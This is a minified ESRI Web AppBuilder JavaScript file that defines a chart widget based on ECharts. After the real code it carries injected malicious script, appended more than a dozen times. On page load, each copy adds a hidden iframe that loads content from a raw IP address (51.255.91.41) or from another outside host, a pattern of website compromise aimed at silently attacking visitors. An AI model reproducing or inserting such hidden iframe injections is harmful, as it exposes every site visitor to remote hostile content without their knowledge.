// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dojo/_base/lang dojo/_base/html dojo/Evented libs/echarts/echarts jimu/utils ./_chartUtils ./_Gauge ./_ChartOptionFactory libs/echarts/light libs/echarts/dark".split(" "),function(g,h,f,d,k,l,m,e,n,p){return g([h,k],{baseClass:"jimu-dijit-chart",templateString:"\x3cdiv\x3e\x3c/div\x3e",declaredClass:"jimu.dijit.chart",config:null,validConfig:{type:"column bar line pie radar funnel gauge".split(" "),common:"type title labels legend confine toolbox color theme backgroundColor scale dataZoom events series advanceOption".split(" "),
axisChart:["stack","axisPointer","hidexAxis","hideyAxis","area"],pie:["labelLine","pieMode","roseType","innerRadius"],funnel:["min","max","funnelSort"],gauge:["shape","min","max","gaugeOption"],radar:["radarShape","indicator"]},postCreate:function(){this.inherited(arguments);var a=this._getChartBox(this.chartDom);d.setStyle(this.domNode,{width:a.w+"px",height:a.h+"px"});this.chart=l.init(this.domNode,this.config.theme||"light");this.gauge=new n({chart:this.chart});this.chartOptionFactory=new p({chart:this.chart,
gauge:this.gauge});this.setConfig()},updateConfig:function(a){if(!a)return!1;this.config=f.mixin(this.config,a);a=this._chartFactory(this.config);this.chart.setOption(a,!0);"gauge"===this.config.type&&"curved"!==this.config.shape&&this.gauge._resetGraphic(this.config);return!0},setConfig:function(a){this.config=a?a:this.config||{};if(!this._checkConfig(this.config))return!1;this._customTheme();this.clear();this.chart.setOption(this._chartFactory(this.config));this._resizeGridAndGraphicOfGauge();return!0},
destroy:function(){this.config.events&&this.config.events[0]&&this.config.events.forEach(f.hitch(this,function(a){this.chart.off(a.name)}));this.chart.clear();this.inherited(arguments)},_showInitChart:function(a){var b;b="column"===a.type||"horizontal"===a.shape||"vertical"===a.shape?"bar":a.type;var c={series:[{data:[{name:"0",value:0}]}]};e.isAxisChart(a)&&(c.xAxis={data:["0"]},c.yAxis={});c.series[0].type=b;this.chart.setOption(c,!1)},_chartFactory:function(a){a.shape||this._showInitChart(a);this.option=
this.chartOptionFactory.produceOption(a);this._bindEvents(a);return this.option},clear:function(){this.chart.clear()},resize:function(a,b){d.setStyle(this.domNode,{width:a||"100%",height:b||"100%"});this.chart.resize();this._resizeDataZoom();this._resizeGridAndGraphicOfGauge()},_getChartBox:function(){var a={w:10,h:10};if(this.chartDom){var b=d.getMarginBox(this.chartDom);0!==b.w&&(a.w=b.w);0!==b.h&&(a.h=b.h)}return a},_resizeDataZoom:function(){var a=this.option,a=this.chartOptionFactory.settingDataZoom(a,
this.config);this.chart.setOption(a)},_bindEvents:function(a){a.events&&a.events[0]&&a.events.forEach(f.hitch(this,function(a){this.chart.on(a.name,a.callback)}))},_resizeGridAndGraphicOfGauge:function(){"gauge"===this.config.type&&"curved"!==this.config.shape&&(this.gauge._resetGrid(this.config),this.gauge._resetGraphic(this.config))},_customTheme:function(){this.chart._theme||(this.chart._theme={});this.chart._theme.tooltip||(this.chart._theme.tooltip={});this.config.confine&&(this.chart._theme.tooltip.confine=
!0);this.chart._theme.tooltip.axisPointer={type:"cross",label:{show:!0,precision:2,formatter:function(a){return"number"===typeof a.value?(a=parseFloat(a.value).toFixed(2),e.tryLocaleNumber(a)):a.value}},lineStyle:{color:"#27727B",type:"dashed"},crossStyle:{color:"#27727B"},shadowStyle:{color:"rgba(200,200,200,0.3)"}};this.chart._theme.valueAxis||(this.chart._theme.valueAxis={});this.chart._theme.valueAxis.axisLabel||(this.chart._theme.valueAxis.axisLabel={});this.chart._theme.valueAxis.axisLabel.formatter=
function(a){return m.localizeNumber(a)}},_checkConfig:function(a){var b=!0;a||(console.error("Empty config"),b=!1);if(!a.type||0>this.validConfig.type.indexOf(a.type))console.error("Invaild chart type!"),b=!1;var c=f.clone(this.validConfig),d=c.common,e=[],e="column"===a.type||"bar"===a.type||"line"===a.type?d.concat(c.axisChart):d.concat(c[a.type]);Object.keys(a).forEach(function(a){0>e.indexOf(a)&&(b=!1,console.error("Invalid configuration parameter: "+a))});return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});